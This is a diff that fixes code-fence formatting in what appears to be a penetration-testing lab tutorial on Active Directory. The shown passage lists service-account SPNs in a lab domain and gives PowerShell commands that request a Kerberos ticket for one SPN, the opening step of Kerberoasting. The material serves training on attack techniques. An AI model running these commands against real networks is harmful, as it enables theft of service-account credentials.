@@ -38,6 +38,7 @@ CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
     MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  
 CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  
     adfsconnect/azure01.inlanefreight.local
+```
 
 **Existing SPNs found!**
 
@@ -47,12 +48,12 @@ Many different SPNs are returned for various hosts. Focus on user accounts and i
 
 ## Targeting a Single User
 
-```powershell
-powershell
 
+```powershell
 PS C:\htb> Add-Type -AssemblyName System.IdentityModel
 PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
 ```
+
 
 This creates a Kerberos ticket for the specified SPN.
 
